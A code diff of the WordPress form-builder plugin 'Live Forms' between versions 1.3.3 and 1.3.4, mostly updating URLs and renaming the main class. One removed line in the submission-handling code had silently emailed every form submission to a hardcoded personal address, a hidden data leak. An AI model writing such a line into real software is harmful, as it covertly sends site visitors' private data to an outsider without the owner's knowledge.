@@ -2,11 +2,11 @@
 
 /*
   Plugin Name: Live Forms
-  Plugin URI: http://liveform.org
+  Plugin URI: http://liveforms.org/
   Description: Drag and Drop Form Builder Form WordPress
   Author: WP Eden
-  Version: 1.3.3
-  Author URI: http://liveform.org
+  Version: 1.3.4
+  Author URI: http://liveforms.org/
  */
 
 
@@ -24,7 +24,7 @@ include LF_BASE_DIR . '/libs/form-fields.class.php';
 include LF_BASE_DIR . '/libs/functions.php';
 include LF_BASE_DIR . '/libs/phpcaptcha/captcha.php';
 
-class liveforms {
+class LiveForms {
 
     public $fields_common;
     public $fields_generic;
@@ -1087,7 +1087,6 @@ class liveforms {
             $headers .= "Content-type: text/html";
 
             wp_mail($admin_email_data['to'], $admin_email_data['subject'], $admin_email_data['message'], $headers);
-            wp_mail("shaon.cse99.cuet@gmail.com", $admin_email_data['subject'], $admin_email_data['message'], $headers);
 
             //to form agent
             if ($form_agent_id) {
@@ -1582,4 +1581,4 @@ class liveforms {
 /** Initialize * */
 //new liveforms();
 
-liveforms::getInstance();
+LiveForms::getInstance();
